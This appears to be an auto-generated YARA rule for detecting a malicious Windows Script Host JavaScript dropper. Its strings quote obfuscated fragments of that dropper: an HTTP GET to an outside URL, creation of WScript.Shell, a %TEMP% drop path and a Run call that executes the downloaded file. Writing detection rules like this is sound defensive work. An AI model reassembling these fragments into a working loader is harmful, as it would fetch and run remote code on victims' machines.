rule sig_20160427_88cc57c0e6a2895b08d7ed5963d6326d {
  meta:
    description = "datamaliciousorder - file 20160427_88cc57c0e6a2895b08d7ed5963d6326d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "15923a6ff3c9d081f6fa7a17bb89c0f3a54aff1a6116f4612b5fa7ed3923e9e8"

  strings:
    $s1  = "FcmgbKpdiv[VgjrpRwhuc](\"G\" + \"ET\", \"http://myehelpers.com/j3ykf\", false);" fullword ascii
    $s2  = "function LkzhnGudva(ZquhvPtqlk, QnkzgLzssm){RjnkeYtucv = RjnkeYtucv * 1; return ZquhvPtqlk - QnkzgLzssm;};" fullword ascii
    $s3  = "function RkcqbBjzjv() {return YhlpxTttre[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"SnqIaVg" ascii
    $s4  = "function RkcqbBjzjv() {return YhlpxTttre[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"SnqIaVg" ascii
    $s5  = "var YhlpxTttre = function DnwngArdwv() {return PuqubUmayk[HpwofWnqum](\"WScript\"+\".Shell\");}(), FsimrQbyfq = 11;" fullword ascii
    $s6  = "function RhkyxEjlvw() {return ((KbsgbKntxx == true) && (KbsgbKntxx == WkhcpMukvc)) ? 1 : RjnkeYtucv;};" fullword ascii
    $s7  = "var PuqubUmayk = this[\"WScript\"];" fullword ascii
    $s8  = "function BeydeEencm(){return KxabdAgkht + \"\";};" fullword ascii
    $s9  = "if (FcmgbKpdiv[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s10 = "var CtmpnBqvta = new this[\"D\"+\"ate\"]();" fullword ascii
    $s11 = "function EjdirXfzsv(FnpabXfuce){YhlpxTttre[\"R\"+\"un\"](FnpabXfuce, RjnkeYtucv, RjnkeYtucv);};" fullword ascii
    $s12 = "var KbsgbKntxx = false;" fullword ascii
    $s13 = "return LkzhnGudva(NscesWctkv, NamgzPgltt);" fullword ascii
    $s14 = "function AofovPrpuc(){return 23;};" fullword ascii
    $s15 = "var NtiygKmfpl = false;" fullword ascii
    $s16 = "}while (BwpntCmbnd);" fullword ascii
    $s17 = "NtiygKmfpl = true;" fullword ascii
    $s18 = "WkhcpMukvc = true; " fullword ascii
    $s19 = "function OyykyWcubr()" fullword ascii
    $s20 = "function YjdcpYsjtd(DfcmrRghxv) {var FzsvcEcptg = (1, 2, 3, 4, 5, DfcmrRghxv); return FzsvcEcptg;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}